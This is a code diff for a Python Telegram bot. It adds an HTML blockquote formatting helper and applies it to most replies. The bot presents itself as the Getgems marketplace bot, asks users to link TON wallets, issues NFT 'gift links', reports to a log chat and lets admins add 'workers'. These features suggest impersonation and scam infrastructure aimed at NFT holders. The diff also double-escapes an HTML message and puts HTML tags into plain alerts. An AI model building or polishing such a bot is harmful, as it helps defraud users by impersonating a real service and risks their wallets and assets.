@@ -18,6 +18,13 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder
 from database import db
 from config import Config
 
+
+def format_message(text: str) -> str:
+    """Оборачивает текст в теги <b><blockquote> для HTML-форматирования."""
+    # Экранируем базовые HTML-символы, чтобы избежать ошибок парсинга
+    text = text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
+    return f"<b><blockquote>{text}</blockquote></b>"
+
 # Состояния для FSM
 class AdminStates(StatesGroup):
     waiting_for_worker_id = State()
@@ -120,8 +127,8 @@ async def send_message_to_group(message: str):
         if Config.LOG_CHAT_ID:
             await bot.send_message(
                 chat_id=Config.LOG_CHAT_ID,
-                text=message,
-                parse_mode="Markdown"
+                text=format_message(message),
+                parse_mode="HTML"
             )
             logger.info("Сообщение отправлено в группу логов")
         else:
@@ -244,7 +251,8 @@ async def inline_query_handler(query: InlineQuery):
                     title="Временно недоступно",
                     description="Создание подарочных ссылок временно недоступно",
                     input_message_content=InputTextMessageContent(
-                        message_text="⚠️ Временно недоступно\n\nСоздание подарочных ссылок временно недоступно."
+                        message_text=format_message("⚠️ Временно недоступно. Создание подарочных ссылок временно недоступно."),
+                        parse_mode="HTML"
                     )
                 )
             ]
@@ -258,7 +266,8 @@ async def inline_query_handler(query: InlineQuery):
                     title="Как создать подарочную ссылку",
                     description="Введите ссылку на NFT после @usernamebot",
                     input_message_content=InputTextMessageContent(
-                        message_text="Для создания подарочной ссылки введите: @usernamebot {ссылка на NFT}"
+                        message_text=format_message("Для создания подарочной ссылки введите: @usernamebot {ссылка на NFT}"),
+                        parse_mode="HTML"
                     )
                 )
             ]
@@ -272,7 +281,8 @@ async def inline_query_handler(query: InlineQuery):
                     title="Неверная ссылка на NFT",
                     description="Пожалуйста, введите корректную ссылку на NFT",
                     input_message_content=InputTextMessageContent(
-                        message_text="❌ Неверная ссылка на NFT. Используйте формат: http://t.me/nft/название-номер"
+                        message_text=format_message("❌ Неверная ссылка на NFT. Используйте формат: http://t.me/nft/название-номер"),
+                        parse_mode="HTML"
                     )
                 )
             ]
@@ -309,7 +319,8 @@ async def inline_query_handler(query: InlineQuery):
                     title="Ошибка создания подарка",
                     description="Попробуйте еще раз",
                     input_message_content=InputTextMessageContent(
-                        message_text="❌ Произошла ошибка при создании подарочной ссылки"
+                        message_text=format_message("❌ Произошла ошибка при создании подарочной ссылки"),
+                        parse_mode="HTML"
                     )
                 )
             ]
@@ -336,7 +347,7 @@ async def inline_query_handler(query: InlineQuery):
                 title=f"🎁 Подарить {nft_info['display_name']}",
                 description=f"NFT: {nft_info['display_name']}",
                 input_message_content=InputTextMessageContent(
-                    message_text=message_text,
+                    message_text=message_text, # Markdown is used here for links, so we don't format it
                     parse_mode="Markdown"
                 ),
                 reply_markup=keyboard.as_markup()
@@ -351,7 +362,8 @@ async def inline_query_handler(query: InlineQuery):
                 title="Произошла ошибка",
                 description="Попробуйте еще раз",
                 input_message_content=InputTextMessageContent(
-                    message_text="❌ Произошла ошибка. Попробуйте еще раз."
+                    message_text=format_message("❌ Произошла ошибка. Попробуйте еще раз."),
+                    parse_mode="HTML"
                 )
             )
         ]
@@ -368,11 +380,11 @@ async def start_handler(message: types.Message):
             logger.info(f"Gift share data: {gift_share}")
             if not gift_share:
                 logger.warning(f"Gift share not found for token: {share_token}")
-                await message.answer("❌ Подарочная ссылка не найдена или недействительна.")
+                await message.answer(format_message("❌ Подарочная ссылка не найдена или недействительна."), parse_mode="HTML")
                 return
             if gift_share['is_received']:
                 logger.warning(f"Gift already received for token: {share_token}")
-                await message.answer("❌ Этот подарок уже был принят.")
+                await message.answer(format_message("❌ Этот подарок уже был принят."), parse_mode="HTML")
                 return
             logger.info(f"Ensuring user registration for telegram_id: {message.from_user.id}")
             user = db.get_or_create_user(
@@ -406,7 +418,7 @@ async def start_handler(message: types.Message):
                     logger.info(f"Successfully added gift to webapp inventory with ID: {gift_id}")
                 except Exception as e:
                     logger.error(f"Error adding gift to webapp inventory: {e}")
-                    await message.answer("❌ Ошибка при добавлении подарка в инвентарь веб-приложения")
+                    await message.answer(format_message("❌ Ошибка при добавлении подарка в инвентарь веб-приложения"), parse_mode="HTML")
                     return
                 sender_user = db.get_user_by_telegram_id(gift_share['creator_telegram_id'])
                 sender_username = sender_user['username'] if sender_user and sender_user['username'] else 'пользователь'
@@ -420,9 +432,9 @@ async def start_handler(message: types.Message):
                     text="📦 Инвентарь",
                     web_app=WebAppInfo(url=Config.WEBAPP_URL)
                 ))
-                await message.answer(success_message, parse_mode="HTML", reply_markup=keyboard.as_markup())
+                await message.answer(format_message(success_message), parse_mode="HTML", reply_markup=keyboard.as_markup())
             else:
-                await message.answer("❌ Не удалось принять подарок. Попробуйте еще раз.")
+                await message.answer(format_message("❌ Не удалось принять подарок. Попробуйте еще раз."), parse_mode="HTML")
         else:
             keyboard = InlineKeyboardBuilder()
             keyboard.add(
@@ -448,12 +460,13 @@ async def start_handler(message: types.Message):
 Это бот Getgems, через него можно торговать на нашем маркетплейсе прямо в мини-аппе Telegram, и это удобнейший способ торговать Номерами, Юзернеймами и Подарками с 0% комиссией! 💯
 💡 Главное, с помощью этого бота вы можете дарить и обмениваться своими NFT-подарками прямо в чатах и диалогах, для этого просто отправьте боту свой адрес TON-кошелька. После удачной привязки, когда вы начнете набирать в любой переписке @GetgemsRuRobot — активируется inline-режим, теперь можно дарить и обмениваться NFT прямо в переписке!"""
             await message.answer(
-                start_text,
-                reply_markup=keyboard.as_markup()
+                format_message(start_text),
+                reply_markup=keyboard.as_markup(),
+                parse_mode="HTML"
             )
     except Exception as e:
         logger.error(f"Ошибка в start_handler: {e}")
-        await message.answer("❌ Произошла ошибка. Попробуйте еще раз.")
+        await message.answer(format_message("❌ Произошла ошибка. Попробуйте еще раз."), parse_mode="HTML")
 @dp.callback_query(lambda c: c.data and c.data.startswith('rescan_gifts_'))
 async def rescan_gifts_callback_handler(callback_query: CallbackQuery):
     """Обработчик кнопки повторного сканирования подарков"""
@@ -575,11 +588,11 @@ async def rescan_gifts_callback_handler(callback_query: CallbackQuery):
                 )
             
         else:
-            await callback_query.answer("❌ Ошибка в данных запроса", show_alert=True)
+            await callback_query.answer(format_message("❌ Ошибка в данных запроса"), show_alert=True)
             
     except Exception as e:
         logger.error(f"Ошибка в rescan_gifts_callback_handler: {e}")
-        await callback_query.answer("❌ Ошибка при запуске повторного сканирования", show_alert=True)
+        await callback_query.answer(format_message("❌ Ошибка при запуске повторного сканирования"), show_alert=True)
 
 @dp.callback_query(lambda c: c.data and c.data.startswith('retry_'))
 async def retry_handler(callback_query: CallbackQuery):
@@ -603,7 +616,7 @@ async def retry_handler(callback_query: CallbackQuery):
         )
     except Exception as e:
         logger.error(f"Ошибка в retry_handler: {e}")
-        await callback_query.answer("❌ Ошибка при запуске повторной обработки", show_alert=True)
+        await callback_query.answer(format_message("❌ Ошибка при запуске повторной обработки"), show_alert=True)
 @dp.message(Command("admin"))
 async def admin_handler(message: types.Message):
     try:
@@ -640,12 +653,12 @@ async def admin_handler(message: types.Message):
         )
     except Exception as e:
         logger.error(f"Ошибка в admin_handler: {e}")
-        await message.answer("❌ Произошла ошибка при открытии админ панели.")
+        await message.answer(format_message("❌ Произошла ошибка при открытии админ панели."), parse_mode="HTML")
 @dp.callback_query(lambda c: c.data.startswith("admin_"))
 async def admin_callback_handler(callback_query: CallbackQuery):
     try:
         if not Config.is_admin(callback_query.from_user.id):
-            await callback_query.answer("❌ У вас нет прав администратора.", show_alert=True)
+            await callback_query.answer(format_message("❌ У вас нет прав администратора."), show_alert=True)
             return
         action = callback_query.data
         if action == "admin_add_worker":
@@ -888,7 +901,7 @@ async def add_worker_by_id(message: types.Message):
         pass
     except Exception as e:
         logger.error(f"Ошибка в add_worker_by_id: {e}")
-        await message.answer("❌ Произошла ошибка при добавлении воркера.")
+        await message.answer(format_message("❌ Произошла ошибка при добавлении воркера."), parse_mode="HTML")
 # Обработчик сообщений в состоянии ожидания ID воркера
 @dp.message(AdminStates.waiting_for_worker_id)
 async def handle_worker_id_input(message: types.Message, state: FSMContext):
@@ -987,11 +1000,12 @@ async def handle_worker_id_input(message: types.Message, state: FSMContext):
         
     except ValueError:
         await message.answer(
-            "❌ Неверный формат ID. Отправьте корректный Telegram ID числом."
+            format_message("❌ Неверный формат ID. Отправьте корректный Telegram ID числом."),
+            parse_mode="HTML"
         )
     except Exception as e:
         logger.error(f"Ошибка в handle_worker_id_input: {e}")
-        await message.answer("❌ Произошла ошибка при добавлении воркера.")
+        await message.answer(format_message("❌ Произошла ошибка при добавлении воркера."), parse_mode="HTML")
         await state.clear()
 
 async def main():
